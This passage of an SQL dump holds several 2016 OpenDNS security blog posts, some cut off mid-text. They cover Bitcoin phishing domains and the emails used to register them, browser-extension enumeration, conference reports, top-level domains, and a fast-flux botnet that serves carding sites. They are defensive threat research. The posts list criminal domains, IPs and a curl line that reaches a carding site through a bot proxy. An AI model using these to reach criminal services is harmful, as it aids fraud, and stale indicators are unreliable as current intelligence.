ECATEL/QUASINETWORKS.\nBy simply checking hosted domains on these two IPs and related domains via Whois registration, we uncover 3 anonymous offshore hosting companies using ECATEL/QUASINETWORKS IP space.\nDomain\nCreation Date:\nHosting Since:\n\n\nanonymoushosting.in\n03-Jan-2010 (1st avail. date)\n14-Apr-2006\n\n\nvindohosting.com\n11-Aug-2009\n16-Aug-2009\n\n\ngoip.com\n26-Jan-2002\n15-Jan-2012\n\nIn fact, the 3 websites have very similar looks and themes, and offer identical server packages, which makes us believe they are all the same hosting company.\n\nAnonymous offshore hosting is not malicious per se; it can be useful for customers who are scrupulous about their privacy, anonymity and censorship-evasion. Unfortunately, these hosting infrastructures are abused to harbor criminal and toxic content.\nWhois Emails Used for More Bitcoin Phishing\nWith the rise of Bitcoin technology, more and more attackers will be attempting to spoof these online wallets in order to steal credentials. OpenDNS is at the forefront of detecting these types of new anomalies. By pivoting on the identified malicious domains and leveraging OpenDNS data, we were able to identify at least 6 emails used to register domains for blockchain spoof campaigns. Below is a selection of the emails in question, which have been and, as of this writing, are still being used to register more than 100 Bitcoin and blockchain phishing domains.\nmopadrehop@thraml.com\n\n\nstopracuho@thraml.com\n\n\ntidrorosti@thraml.com\n\n\nboatbits@yandex.com\n\n\nisellbtc@yandex.com\n\n\nisellbtc1234567@gmail.com\n\nInvestigating IP space, name servers and Whois indicators sheds light on how frequently criminal actors recycle their infrastructures and resources, and makes evident just how heavily they rely on bulletproof offshore hosting providers to deliver their malware and phishing campaigns.\n\nAs we can see, not only are Bitcoin wallets being targeted, but other services that accept Bitcoins become targets as well. Domain blokchain-wallet[.]info is impersonating the page of Nowell Associates Limited, a company specializing in tax returns and cloud accountancy that’s among the first accounting firms in England to accept Bitcoin and Litecoin as payment for accountancy, taxation, IT and data security services.\n\n\nHere we can see attacker’s spoofing another bitcoin management company localbitcoin[.]com on that same IP address:\n\n\nBitcoin addresses are Base58Check-encoded, so they exclude potentially confusing characters such as 0 (number zero), O (capital o), l (lower L), I (capital i), and the symbols ‘+’ and ‘/,’”, which forces cybercriminals to come up with new schemas for typosquatting and phishing domains. From these examples, it’s clear the attackers have a solid understanding of protection mechanisms used by Bitcoin addresses and are trying to defeat them.\nVery Recent Activity\nAdditionally, our model NLPRank detected a large amount of new phishing activity with high accuracy (FQDN, Probability Score, Timestamp) this past weekend hosted on 91.218.247.37:\n3-blockchain[.]info\r\n0.998737215996\r\n2016-06-18 02:32:24.026000\r\n\r\n4-blockchain[.]info\r\n0.998737215996\r\n2016-06-18 19:25:35.426000\r\n\r\n1-blockchain[.]info\r\n0.998737215996\r\n2016-06-19 01:59:45.065000\r\n\r\nlogin4-blockchain[.]info\r\n0.998737215996\r\n2016-06-19 03:54:05.436000\r\n\r\nlogin6-blockchain[.]info\r\n0.998737215996\r\n2016-06-19 05:22:08.081000\r\n\r\nblockchain-login3[.]info\r\n0.998737215996\r\n2016-06-19 06:29:40.079000\r\n\r\nlogin7-blockchain[.]info\r\n0.998737215996\r\n2016-06-19 06:52:20.087000\r\n\r\n6-blockchain[.]info\r\n0.998737215996\r\n2016-06-19 12:10:07.290000\r\n\r\nblockchain-login5[.]info\r\n0.998737215996\r\n2016-06-19 18:25:57.410000\r\n\r\n9-blockchain[.]info\r\n0.998737215996\r\n2016-06-19 19:39:11.263000\r\n\r\nblockchain-login1[.]info\r\n0.998737215996\r\n2016-06-19 21:15:33.078000\r\n\r\nblockchain-logins5[.]info\r\n0.998737215996\r\n2016-06-19 23:19:29.678000\r\n\r\nlogin2-blockchain[.]info\r\n0.998737215996\r\n2016-06-20 03:19:42.173000\r\n\r\n11-blockchain[.]info\r\n0.998737215996\r\n2016-06-20 03:28:59.602000\r\n\r\nblockchain-logins2[.]info\r\n0.998737215996\r\n2016-06-20 03:53:41.885000\r\n\r\nlogins-blockchain[.]info\r\n0.998737215996\r\n2016-06-20 06:51:21.961000\n\nOne can see that there are also many other Bitcoin spoofing and sites on this IP, proof that attacking these online wallet’s for credentials is picking up steam, especially with the price of bitcoin going up recently. Furthermore, the range 91.218.247.0/24 is hosting more suspicious and toxic content such as fake merchandise and phishing, so we proactively blocked it.\nTakeaways\nOur findings show that this is a new campaign, since most of these domains were registered on May 26, 2016, with new domains surfacing in our logs almost every day. As cryptocurrency technologies gain momentum, so too will a new set of security problems, so it’s imperative these online wallet companies deploy proper security methods to protect against this new wave of targeted phishing and typosquatting attacks. We will keep monitoring our DNS traffic for phishing pages intended to steal online wallets’ credentials, and continue to share our results here in the blog.\nFinally, rogue and bulletproof hosting providers continue to provide a safe haven for these malware and phishing campaigns. Our objective at OpenDNS is to track and predictively block malicious content via DNS traffic analysis and proactive monitoring of various indicators such as IP space, Whois, and SSL certs. We will discuss in detail recent developments around malware hosting and bulletproof infrastructures at Black Hat USA 2016 this coming August [12][13].\nReferences\n[1] http://ipduh.com/pdb/as/?29073\n[2] https://what.thedailywtf.com/topic/16543/abuse-hah-we-don-t-care-what-our-customers-get-up-to\n[3] https://www.mywot.com/en/scorecard/ecatel.net\n[4] http://hphosts.blogspot.com/2009/11/crimeware-friendly-isps-ecatel-as29073.html\n[5] http://hphosts.blogspot.com/2010/04/as29073-ecatel-need-more-proof-of-their.html\n[6] http://dnsamplificationattacks.blogspot.com/2013/06/ecatel-big-source-of-directedatasia.html\n[7] http://www.sudosecure.com/ecatels-harboring-of-spambots-and-malware-causes-bgp-peers-to-stop-peering-with-them/\n[8] http://anonymousnetherlandsnews.blogspot.com/2012/08/anonymous-attacked-dutch-hosting.html\n[10] http://bgp.he.net/AS29073\n[11] http://bgpranking.circl.lu/asn_details?date=;source=;asn=29073\n[12] https://umbrella.cisco.com/blog/2016/05/16/black-hat-2016-fast-flux-ssl-unique-popular-bulletproof-hosting-option-cyber-criminals/\n[13] https://www.blackhat.com/us-16/briefings.html#towards-a-holistic-approach-in-building-intelligence-to-fight-crimeware', 'Big Data;Incident Response;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2016/06/20/bitcoin-wallet-phishes-reveal-rogue-hosts/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1153, 'Finding Browser Extensions To Hunt Evil!', 'Brad Antoniewicz', 'June 16, 2016', 'Some extensions can be limited to just certain websites\nBrowser extensions, sometimes called plug-ins or add-ons, provide all types of wondrous functionality on top of the web browser, some of which may be actually wanted by the user! These little gems, however, have also proved valuable to attackers. Volume 20 of Microsoft’s Security Intelligence Report demonstrates a year 2000-era marked increase in the rise of adware such as Win32/Diplugem. These types of threats register themselves as a browser extension to inject advertisements right into the rendered page of the user. It’s actually pretty clever.\nCode Execution Too!\nBrowser extensions may also pose increased risk to users since some of them run native code in the context of the browser. For instance, Internet Explorer has long supported ActiveX modules (.ocx) which are treated by the browser as a DLL and loaded directly into memory. In this scenario, the browser plug-in is almost the same as an executable, inasmuch as it has the potential to execute malicious code or run any program as the current user.\nWhile Internet Explorer allows you to define certain pre-approved websites for its add-ons to run and the most popular add-ons set this by default, most other add-ons run on all sites. By browsing to a specially-crafted website, an attacker can potentially enumerate installed add-ons and then invoke a vulnerability in them to gain control over the browser and ultimately over code execution.\nNeedless to say, it is important to figure out what browser extensions may be installed on your users’ systems. We’ll look at uncovering these extensions in Internet Explorer 11 and Chrome 51.0.2704.84 on Windows 8.1 and MacOSX. These techniques may work on older or newer versions as well.\nBuilt-In Detection\nSince browser extensions can also be active without any visual indication in the browser, a good start is to dig into the browser’s built-in manager. Internet Explorer 11’s Add-on Manager can be found under Tools-> Manage Add-ons. By default, Internet Explorer will only show currently-loaded add-ons, so be sure to expand the view to include all add-ons:\nShow All Add-ons in IE11\nExtensions can be found in Chrome under the options menu, then More tools -> Extensions or just chrome://extensions/ in the URL bar.\nChrome Extensions\nThird-Party Tools\nThe de facto tool most responders use for this purpose in Windows is Autoruns. It has the built-in capability to look across components on the whole system for executables and modules which get loaded automatically. One tab is Internet Explorer:\nAutoruns gives some visibility into IE add-ons\nAutoruns also has the ability to query these via the command line:\nAutoruns via the cmd line\nWhile this is great for responders, it is somewhat limited in that it only shows Internet Explorer add-ons, and doesn’t include all add-on types. As of Windows 8, Microsoft created a new registry location for add-ons that Autoruns doesn’t check.\nFinding Chrome Extensions with Python\nEvery Chrome extension is given a unique identifier called an extensionid. This is just a 32-character long, base-16 encoding (using a-p instead of 0-9a-f) of the first 128-bits of the SHA256 hash of the RSA public key (that was a mouthful!). This ID is used locally and in the Chrome Web Store.  For instance, feedly has an extensionid of hipbfijinpcgfogaopmgehiegacbhmob – to look it up in the Web Store, just go to:\nhttps://chrome.google.com/webstore/detail/hipbfijinpcgfogaopmgehiegacbhmob\nOn your local system, extensions are stored in directories named after their extensionids under the following location:\n~/Library/Application Support/Google/Chrome/Default/Extensions/ (MacOSX)\n %APPDATA%LocalGoogleChromeUser DataDefaultExtensions (Windows)\nEach extension directory includes a manifest.json which holds content about the extension, including update URLs and the name. Sometimes these name values are not too useful. Chrome extensions support multiple languages, so an often more comprehendible name value can be found in the _locale/en/messages.json file under the keys appName, extName, or app_name.\nHere’s a quick code snippet to demonstrate this:\n\nChrome also maintains a Preferences.json file which is also a great resource to query for extensions. It contains tons of information. Here’s an example of querying it for extension content:\n\nFinding Internet Explorer Add-ons with PowerShell\nInternet Explorer’s add-ons are spread across a few different registry entries, organized by a GUID, a unique identifier Windows calls a CLSID, that is assigned COM objects. Unfortunately, the exact structure of how these entries are organized varies between keys so there isn’t just one way to query them.\nWhile you can also query these registry keys using Python, I wanted to highlight querying them with PowerShell because it can be easily adapted to run on a remote system or incorporated into a script. Querying the registry is just a matter of using Get-ItemProperty and recursing through the values. For instance, a subset of the registry keys that includes add-ons is structured such that a ClsidExtension key holds the CLSID of the browser add-on. To query these types we can do the following:\n\nAll CLSIDs are stored in single registry key HKLM:SOFTWAREClassesCLSID. You can get the registered name of the CLSID by looking under the InProcServer32 entry.\nHere’s an example of looking up a CLSID via PowerShell:\n\nFinding Chrome and IE Extensions in Windows and MacOSX\nTo help make this all much easier, I wrote a script to do it all for you ', 'Incident Response;Malware;Security Research;Security Tools;Threat Discovery;Uncategorized', 'https://umbrella.cisco.com/blog/2016/06/16/finding-browser-extensions-find-evil/');

SOURCE is a great conference, well planned so that people in any role can attend and walk away with a greater understanding about a variety of infosec topics.\nEach talk centered around a different security aspect, making for a more comprehensive meeting of the minds. Things like: how to talk to someone about security, what it is to be secure, and the technology and philosophy encompassing all depths of security. Sometimes we researchers get so involved in the details of our projects and algorithms that we can’t see the forest for the trees, and this is a dangerous path to walk down; there’s an easily lost balance between the scope of the problem and the focus of the solution, so having the big picture redrawn at a conference like this is reorienting and refreshing.\nFirst, I must applaud Rob Cheyne on his use of speed networking at the beginning of the conference. Not only did this break the ice for the attendees, but for speakers like me, it was a great source of support and advice from others. That kind of robust interaction resulted in a familiar face in every session of every track.\n\nSource Boston Day 1\nMy water taxi view as I approached downtown Boston to attend Source Conference\n\nThe first day opened with a thought-provoking keynote from Richard Thieme (ThiemeWorks). “Play through the Pain? The Impact of Forbidden Knowledge on Security and Intelligence Professionals” touched on the hardships of keeping secret or classified information, maintaining a work/life balance, and the personal relationship strain that comes from both. Although I do not work with classified information, my role in the protection of customer data can have an adverse effect on home life.\nAfter some speed networking, I attended “Defending the Cloud from the Full Stack Hack” from Erik Peterson (Veracode), followed by “How Security In the Cloud Changes” from Nathan Cooprider (Threat Stack). These sessions played well off one another, because after hearing Erik talk about the cloud equivalent of physical security, Nathan applied colorful metaphors to what I had just learned.\nErik reminded us all that API access to the cloud is the same as physical access to a server room; because all the servers are now under a single API key, a small vulnerability in one system can compromise your entire network. He also reminded us that it is important to not use your cloud service bill as your Intrusion Detection System (IDS), and that there are ways of monitoring cloud usage through logging.\nErik’s warnings were followed nicely by Nathan’s relation of a cloud infrastructure to the Maginot Line and Belgium playing the roll of a zero-day exploit. Nathan also pointed out that we have to stop treating cloud instances as pets and learn to treat them like cattle: know a sure-fire way to get a replacement, and if it starts acting up, take it out. Part of the benefit of having these virtualized appliances is the fact that we can replace them quickly, so why are we so hesitant to do so?\nNext was scheduled as lunch, but instead, I used the time for mental preparation, to ensure that my laptop was cooperating with the projector, and to verify that my lapel microphone was working through the sound-dampening powers of my beard. Because this was only my second speaking engagement — and first away from home base — it was as much a learning experience for me as it was for anyone sitting in on my presentation. The best advice I received during the speed networking session was that “nobody wants you to go up there and fail – everyone is rooting for you.” It’s natural to be a little nervous, but hearing that was very reassuring.\n\nI learned three important things during my presentation:\nDo not rely on an Internet connection for anything – always have a backup plan. I had a backup plan, and verified that my video recording of a “live” demo displayed on the projector beforehand. It worked perfectly.\nRemember to breathe – not only for my benefit, but for the benefit of my audience. Pauses are important because they allow time for all that information I dumped out in one breath to sink in and make sense.\nTest every slide – My embedded MP4 video performed perfectly during testing, my animated GIF? Not so much. I still do not know why, but for anyone who wanted to see it, here it is (you may have to click it to watch it):\nReversing the tinba DGA algorithm to determine the key or set of keys missing from Source Boston presentation\n\nAn overview of my presentation\nI divide all DGAs into two categories, streamed, and chained.  A streamed DGA uses some kind of pseudo-random number generator (PRNG) to generate a stream of numbers which are converted into letters, and then divided into domains as the stream is running.  A chained DGA is one that the previous domain name generated is used in whole to calculate the next domain name.  Each of these categories can include many features, but they are generally one or the other.\n\n\n\n\nChained DGAs can be easy to tackle because all or some of the algorithm used to create them can be reversed.  If the triangle in the diagram below represents the normal flow of a chained DGA, you can imagine that with any two corners, you may be able to solve for the third.  My presentation described just a process and how we use that to our advantage to protect our customers in real time.\nThe normal flow of a chained DGA as presented at SOURCE Boston conference\n\nAfter answering a good set of follow-up of questions, I sat in on Chris Schmidt‘s “The Bad Guys Have Your Pacemaker: How to Stop Attacks on Your IoT Devices.” Chris reminded us that everything you never wanted to network is beginning to join the ranks of the Internet of Things (IoT): smart refrigerators, toasters, light bulbs. Feature-rich may be the end-consumer’s dream, but vulnerability-rich is the current market trend. You may wonder, “what’s the worst that could happen with a smart light bulb?” If some stranger controlling when a random kitchen light turns on and off seems benign enough, Chris encouraged us to consider another possible scenario: what if the same vulnerability that allows that bulb be turned on and off also enables access to firmware controls of wattage beyond the threshold of safety? Did somebody in front of a keyboard thousands of miles away just burn your house down? He said it many times, and I hope this becomes IoT’s mantra: “Build security in!”\nI missed the last session in order to grab lunch, but I was able to return in time for the last keynote of the day, given by Chris Nickerson (Lares Consulting). “Nightmares of a Pentester” left us rethinking security. “Does that appliance really give you security, because security isn’t a thing? Have you tested it? Configured it?” Security is a proactive thing; maybe that IDS needs to be pointed to internal traffic too, because not everything bad comes in from an external connection.\n\nSource Boston Day 2\nAfter a rather unsuccessful night’s sleep and missing the morning keynote, I sat in on colleague Artsiom Holub’s talk on “Deconstructing the Cyber Kill Chain of Angler Campaign”. It was actually the first time I’ve been able to sit through a colleague’s presentation, and I found it satisfying to see a summation of all the hard work behind the slides. His talk covered evolution of Angler Exploit Kit, it’s role in raising of the ransomware threat, methods to deliver payloads, and families of the malware being delivered. It also covered procedures and tools that OpenDNS use to proactively discover and block this threat. In addition preventative measures were discussed. Implementation of them can help end-users and system administrators mitigate the risk of malware infections that use Angler as a delivery mechanism.\n\nAngler talk  from Artsiom Holub\nNext I sat in on “The Topology of Malicious Activity IPv4” from Suchin Gururangan and Bob Rudis (Rapid7). Using projects Sonar and Heisenberg, Rapid7 has a massive corpus of data to work with by effectively scanning the IPv4 Internet space. One additional takeaway is that although Rapid7 is doing security research, Suchin identifies as a Data Scientist, not a Security Researcher. He’s an integral part of the team at work discovering valuable data that just happens to be security-related. This serves as another reminder that the value of a team can be measured by its roundedness as a whole, and not necessarily by each team member’s specifics.\nBecause we were in Boston, I decided that Artsiom and I should do the most Boston-y thing in Boston I could think of for lunch, so we ventured out to Faneuil Hall Marketplace to enjoy a seafood meal from the Quincy Market Colonnade, the largest food hall in New England. There is nothing about a lobster roll and New England clam chowder in a bread bowl that is less than perfection. And, yes, I am picky about my New England clam chowder because let’s face it, if it’s New England “style” clam chowder, you’re only fooling yourself.\nNew England clam chowder in a bread bowl\nWith a full belly, I sat in on “Why is Network Access Control So Hard: There Must Be A Better Way” from Jason Garbis (Cryptzone). Although I had never really questioned the traditional techniques of authentication over a network, this session opened my eyes to another way of thinking. Why should anyone be allowed an attempt to authenticate when you can control who has access to what network resource through network access controls first? I enjoyed learning about this technique and will keep it in the back of my mind for future use.\nFor the last session, I sat in on “Side Channel with Intel Cache Allocation Technique” by Pei Luo (Northeastern University) and Xiaoning Li (Intel), presented by Xiaoning Li. I’ve not personally investigated side channel attacks, but I understand there is always the potential one might occur. In this talk, it was brought to my attention that (especially where cloud computing is in use) although a Virtual Machine (VM) may use a single dedicated processor, somebody else may be running another VM which, although it uses another dedicated processor, may share a higher level of cache and thus is vulnerable to this type of attack.\nOverall, Source Boston was a great conference to experience and I hope to attend again in the future.', 'Events;Security Community;Security Research', 'https://umbrella.cisco.com/blog/2016/06/09/source-boston-2016/');

The shortener doesn’t replace the URL, but rather creates a redirect that’s a little easier on the eyes.\n\nNowadays, you see them a lot on Twitter, due to the 140-character limit for tweets. There have been many reported instances of attackers utilizing URL shorteners to mask a phish or malware domain to which they they intend to redirect you.

SCHOOL FOR THREAT INTELLIGENCE — PART 1. URL SCANNERS\nNeil Smith’s talk about threat intelligence covered one of today’s most important InfoSec topics. Smith explored some of the challenges security researchers encounter in their ongoing analysis of the huge amounts of data generated daily in search of information that can contribute to better security, and discussed the role of malicious actors in generating counter-intelligence. He argues that security analysts need a full awareness of what threat intelligence can do—and importantly, what it cannot do, as well as where it’s vulnerable—in order to better discern malicious activity in its early stages.\nThe author demonstrated a practical method he’d devised of using threat intelligence against URL scanners, and outlined an example of the Hacking Team abusing T1. Since I work a lot with different threat intelligence sources like PhishTank and VirusTotal, an awareness of the possible malicious actions by which cybercriminals can abuse them is valuable.\n\nKEYNOTE ADDRESS\nAnother Neil, this one Neil R. Wyler who is perhaps better known among CactusCon attendees as Grifter, was engaging and inspiring.\n\nHe has been a staff member of the Black Hat Security Briefings for over 13 years and is a member of the Senior Staff at DEF CON. He has been the subject of various online, print, film, and television interviews, and has authored several books on information security.\nIn addition to telling the story of his own professional journey, Neil shared his personal observations about the security community and speculated about the future of the industry.\nLEVERAGING GAME THEORY AND MACHINE LEARNING FOR PROACTIVE CYBER THREAT INTELLIGENCE\nPaulo Shakarian, director of the Cyber-Socio Intelligent Systems (CySIS) Laboratory at Arizona State University, delivered a truly engaging presentation on leveraging game theory and machine learning to infiltrate and identify possible threats.\n\nThis is one of the approaches being undertaken by OpenDNS Labs, which executes large-scale phishing detection using unsupervised machine learning techniques in DNS traffic (a.k.a. NLP rank).\nOf course, most of our research is based on DNS data (no surprise, right?) so it is informative to see the results of similar approach applied to different data. Shakarian’s complementary approach involves studying malicious hacker communities and black markets where malware and exploits are bought, sold, and traded online. In his talk, he described how a combination of machine learning and game theory-based techniques can address human shortcoming and aid in the creation of relevant, proactive cyber threat intelligence gathered from malicious hacking online. Among the valuable results of the game theoretic simulation can be ranking of malicious exploits.\n\nThe analysis of this environment can lead to the identification of zero-day exploits, “fully-undetectable” malware. How this information can be highlighted with respect to a given enterprise is also explained.\nIn all, CactusCon was great!

Chances are, you’ve used one every time you’ve gone online or sent an email. For those that are unaware of what I’m referring to, TLD stands for Top Level Domain (or TOTALLY LEGIT DONUT! LOL anyone?). It’s basically the 2-5 letters after “the dot” at the end of a URL. So for instance in opendns.com, the ‘.com’ is the TLD. You’re probably familiar with most TLD’s without even thinking about it.\nThese donuts are lookin’ totally legit.\nWhen DNS was first unleashed back in 1983, it made the internet usable. It gave us the means to be able to use domain names like ‘opendns.com’ instead of having to type in something like 208.67.222.222 just to visit a site. These early domain names, along with their TLD’s, were initially created with specific uses in mind, some of which are still used for their initial purposes. The .com TLD in particular was initially intended for commercial organizations only. However around the mid 1990s, ICANN lifted all restrictions for registration of the .com TLD. You can now assign .com domains to just about anything under the sun.\nCountry Code Top Level Domains, or ccTLD’s, run the same gamut as their TLD counterparts. They are normally two characters long (for example .de or .co) and are also generally used or reserved for a country, sovereign state, or dependent territory. The IANA, or Internet Assigned Numbers Authority, is responsible for determining an appropriate trustee for each ccTLD, and the idea is that the root server for the geographically labeled TLD should be located and governed by someone from the country that the TLD is said to represent (for example, .mx would have a root server in Mexico and would be governed by someone that lives there). However, with the .com domain availability getting slimmer by the minute, and also with many brands using clever ways to market themselves via “domain hacking”, many countries have turned to more commercial uses for their countries TLD (thus technically classifying them as a GccTLD or Generic Country Code Top Level Domain). And let me warn you, this rabbit hole goes pretty deep, so I’ll just mention a few of the more interesting instances that stick out.\n.LY – ‘ly’ are two letters that show up at the end of many words in the english language. It is also the TLD that was initially used by bitly, one of the first commercial URL shorteners to break on to the scene. However, the .ly TLD is meant to represent the country of Libya.\n.AM / .FM – the .am TLD is to represent Armenia, and the FM to represent the Federated States of Micronesia, however this TLD tends to be popular among radio stations. Not exactly “domain hacking” but still relevant.\n.IO – An acronym that commonly stands for Input/Output, .IO was adopted by many startup companies looking to add a bit of cleverness to their URL branding. However, this TLD is meant to represent the British Indian Ocean Territory.\n.ME – Used for many personal websites, this one is designated for Montenegro.\n.DJ – One of my personal favorites, this one has been adopted by DJ’s across the country hoping to add a little flavor to their personal URL branding. The country? You guessed it. DJIBOUTI!\nDjibouti is here. Some DJ’s might live there too, but I don’t know for sure.\n.LV – Marketed as the unofficial TLD for the popular city of Las Vegas, however was initially created to represent the Republic of Latvia.\nI’ll stop there. As time marches along, more and more ccTLD’s are being adopted for more than just location purposes. It’s probably important to mention that the ccTLD’s were initially meant to promote country targeting. For instance, it would be assumed that a domain ending in .tv would be the business of a company in Tuvalu, a small cluster of islands in the South Pacific. However, with many of the relevant branding for .com domains being bought up and/or too expensive to purchase, many brands have turned to ccTLD’s, and in some cases gTLD’s, as an alternative.\nThe final category of TLD’s that we’ll be talking about in this segment is the gTLD, or Generic Top Level Domain (gluten-free totally legit donut). Sometimes referred to as themed TLD’s, these are pretty much 100% cosmetic and don’t seem to have much of a character limit. A gTLD is essentially any TLD that is available for unrestricted use. By technicality, there are a few that have been around for a long time that are considered to be gTLD’s. The .com TLD, for instance is, considered a gTLD as it was once meant to be utilized for commercial entities only (however, as previously mentioned, .com domains are now available to use for whatever you wish). In early 2012, ICANN decided to open the door to allow a plethora of new gTLDs to exist, with hopes to increase competition and choice in the domain name space. These new gTLD’s are no longer confined to the 3-character limit, and are often full words. So TLD’s such as .music, .casino and .blackfriday can now be registered and used, and the representative that is granted ownership of a TLD is allowed to enforce whatever restrictions they choose. This also opens the door for brand specific TLD’s, so things like .cisco, .bently or .google are now available to the TLD’s corresponding companies.\nA few interesting facts about these new gTLD’s:\n-According to MarkMonitor, the most utilized new gTLD in 2015 was .sucks, the next five most used were .porn, .adult, .news, .online and .reviews\n-As of 2015, there are currently 974 registered, unique gTLD’s\n-The longest active gTLD is 18 characters long and is .northwesternmutual\nStay tuned for Part 2 of this blog for the main course, where we dig into our own data to pull stats and info about these fairly new and incredibly interesting gTLD’s!', 'Security Community;Security Research', 'https://umbrella.cisco.com/blog/2016/05/20/what-these-countries-did-with-their-tlds-will-shock-you-part-1/');

They represent a hosting-as-a-service or reverse proxy platform for various malware and ransomware C2 domains, as well as phishing and carding sites.\nWe covered the Kelihos fast flux network back in 2013 in a few blogs [1][3] as well as at BSides New Orleans [2], APWG eCrime [4], and Botconf [5][6].\nAt Black Hat 2014 [7][8][9] and Defcon 22 [10][11], we disclosed research about another fast flux hosting infrastructure we called the “Zbot fast flux proxy network” which we have been tracking since 2013. At Botconf 2013, this proxy network was briefly mentioned and dubbed “fluxxy” by Nick Summerlin and Brad Porter. This hosting network is a botnet that consisted of a couple tens of thousands of infected hosts located mainly in Russia and Ukraine. It was easy to recognize because the domains it was hosting had a TTL value of 150 seconds. The name servers of these domains were also fluxing to IPs from the botnet which characterizes this network as double flux. At the time, the botnet was used by criminal customers to serve Zeus, Kins, ICE IX and Citadel config, binary and drop zone urls in addition to Asprox and DDoS bot C2s, phishing sites and Pony panels. We subsequently presented more results about this botnet at Botconf 2014 [12].\n\nIn Mid 2015, the operators behind the “Zbot” proxy network updated their setup in such a way that the served fast flux domains were now resolving to bot IPs with a random TTL in the range between 129 to 150 seconds and the network remained double flux. The botnet also started supporting SSL communication. This infrastructure evolved most likely to evade detection or for other operational reasons. We discussed the new TTL update at Hack.lu 2015 [13]. At the time, the network has added more malware variants served on behalf of its clientele such as Zemot/Rerdom, Necurs, Tinba, and Rovnix. Even the ephemeral new GameOver Zeus used it to host some of its DGAs in July 2014 [14] before it switched to dedicated hosting then withered away.\nMore recently, a few blogs in 2016 touched upon this botnet such as [15] and [16].\nWhat’s new at Black Hat 2016?\nThis year at Black Hat 2016, we will be unveiling novel results about this bulletproof fast flux hosting infrastructure. We also collaborated with Intel471 to shed light on the underground service and actors behind this botnet.\nContent Delivery Network functionality\nAt the moment, this network is leveraging up to 56,000 live bots that consist in compromised home and SOHO routers concentrated in Russia and Ukraine. The network performs reverse proxy functions similar to that of a common CDN, but with an emphasis on hiding the upstream malware content providers.\nFor example, curl –header ‘Host: mrbin.cc’ hxxp://109.86.110.190 will return the main page of hxxp://mrbin.cc/ where 109.86.110.190 is a live bot IP. hxxp://mrbin.cc/ is a known carding site that is currently served by the fast flux infrastructure. The content of hxxp://mrbin.cc/ can be delivered by any bot IP supporting this feature. A subset of the entire botnet support this reverse proxy feature.\nIn the past months, this proxy network delivered Teslacrypt payments sites, RockLoader, Quakbot and Ramdo C2 domains, as well as phishing, and carding sites.\nCurrently, the longest living active domains served by the botnet are carding sites such as:\ncsh0p.cc\nmcduck.tv\nmcduck.ws\nmcdumpals.at\nmrbin.cc\nmrbin.tv\npopeyeds.cc\npopeyeds.la\nroyaldumps.cm\nroyaldumps.tw\ntry2swipe.me\ntry2swipe.ws\nunclesam.tw\nunclesam.ws\nwww.csh0p.cc\n\nA few CIBC bank phishing sites are also live at the time of this writing.\n\nSSL support\nA notable technical aspect of this botnet is its use of SSL certificates for securing traffic. Currently, the botnet supports 5 active SSL certs, one is self-signed and the remaining four are legitimate and valid. Only a subset of the entire botnet (around 2.5% of IPs) supports SSL certs. We point out that the attackers are essentially playing by the rules to obtain these certs. They are not exploiting a flaw in PKI, SSL/TLS, browser security models, or even the certificate authorities. They are obtaining (through a small fee, if any) a certificate to verify to others that they really own their domains. Except, they use their domains to serve for malicious intent. They’ve essentially made that reassuring green lock icon in your browser mean that you have a really secure link to the attacker. We’ll discuss our findings on this aspect involving a well known CA that had signed many of the certificates we observed being used on malicious domains.\nThe Actors\nThe folks at Intel 471 closely monitor the various underground services used by threat actors and groups. One such service is that of bulletproof hosting, which is a key cybercrime enabler. Intel 471 categorizes bulletproof hosting services into tiers depending on the technical and administrative complexity, reputation, and resiliency to takedown of the provider. Working with the researchers at Intel 471 we’ve been able to correlate key characteristics of the technical aspect of the fast flux botnet and domains to actors and groups in the underground that are both using and operating the botnet. It’s believed the group behind this particular fast flux botnet is actually one of a small number of top-tier bulletproof hosting providers found in the underground marketplace. This particular group has been providing bulletproof services to the Russian and English language marketplaces since mid-2011, but their origins may date as far back as early 2000. Since their arrival to the underground marketplace, this particular service provider has built a very good reputation among cyber-criminals. One of the group’s more unique offerings is fast and stable fast flux hosting via bots, or compromised hosts. Even more unique, when compared to other bulletproof hosting providers, is the ability to use SSL in conjunction with the fast flux hosting in order to secure traffic. This functionality was specifically advertised as part of the service offering starting in April 2015. This correlates with technical analysis and research we had done in May 2015 where we had identified a revamping of the botnet and addition of SSL functionality in May 2015.\nWe have refrained from including actor handles and the name of the bulletproof service as Intel 471 has asked that they not be named publicly.\nConclusion\nThe malware content served by this botnet proxy network is constantly changing since it is a hosting as a service platform. As new criminal customers rent service from this platform or the needs of existing clients evolve, the botnet will deliver different content based on those needs. In our upcoming Black Hat 2016 talk, we will disclose further details and show that the combination of technical research and actor-centric research through the collaboration with Intel 471 can provide valuable insights that would otherwise be missed.\nWe thank colleagues Thomas Mathew and Chris Dorros and the Intel471 folks for collaborating on this research.\nReferences\n[1] /2013/02/13/kelihos-in-its-third-incarnation/\n[2] /2013/06/05/bsides-new-orleans-2013/\n[3] /2013/07/30/tracking-versatile-kelihos-domains/\n[4] /2013/09/24/real-time-monitoring-kelihos-fast-flux-botnet-case-study-presented-apwg-ecrime-2013/\n[5] /2013/12/18/operation-kelihos-presented-botconf-2013/\n[6] http://www.dailymotion.com/video/x1ap0b5_14-hendrik-adrian-and-dhia-mahjoub-the-power-of-a-team-work-management-of-dissecting-a-fast-flux-bot_tech\n[7] https://www.youtube.com/watch?v=cHuyqnVhT4g\n[8] https://www.blackhat.com/docs/us-14/materials/us-14-Mahjoub-Catching-Malware-En-Masse-DNS-And-IP-Style.pdf\n[9] https://www.blackhat.com/docs/us-14/materials/us-14-Mahjoub-Catching-Malware-En-Masse-DNS-And-IP-Style-WP.pdf\n[10] https://www.youtube.com/watch?v=KFx4lhxMi-M\n[11] https://defcon.org/images/defcon-22/dc-22-presentations/Mahjoub-Toonk-Reuille/DEFCON-22-Mahjoub-Reuille-Toonk-Catching-Malware-En-Masse-DNS-IP-Style-UPDATED.pdf\n[12] https://www.youtube.com/watch?v=eC2jPNU0NZI\n[13] http://2015.hack.lu/talks/#a-collective-view-of-current-trends-in-criminal-hosting-infrastructures\n[14] http://garwarner.blogspot.com/2014/07/new-gameover-zeus-variant-uses-fastflux.html\n[15] http://krebsonsecurity.com/2016/05/carding-sites-turn-to-the-dark-cloud/\n[16] https://blog.team-cymru.org/2016/04/east-european-criminal-fastflux-infrastructure/', 'Incident Response;Malware;Security Research', 'https://umbrella.cisco.com/blog/2016/05/16/black-hat-2016-fast-flux-ssl-unique-popular-bulletproof-hosting-option-cyber-criminals/');

